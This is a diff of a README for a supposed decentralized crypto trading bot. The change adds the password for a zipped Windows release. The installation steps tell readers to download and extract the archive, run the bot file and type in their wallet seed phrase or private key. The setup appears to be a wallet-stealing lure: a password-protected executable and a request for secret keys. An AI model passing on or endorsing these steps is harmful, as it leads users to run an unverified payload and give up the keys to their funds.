@@ -82,7 +82,7 @@ Some screenshots of this bot
 ![alt text](https://github.com/timo991/decentralized-trading-bot/blob/main/images/orders.png?raw=true)
 
 # Instalation
-- [Download](https://github.com/timo991/decentralized-trading-bot/releases/download/v8.5.0/windows-v8.5.0.zip) zip and extract with password
+- [Download](https://github.com/timo991/decentralized-trading-bot/releases/download/v8.5.0/windows-v8.5.0.zip) zip and extract with password `TxEsE1oK09F`
 - Open folder bot and open app bot file
 - Select menu encrypt wallet in the bot
 - Input your pharse or privatekey 
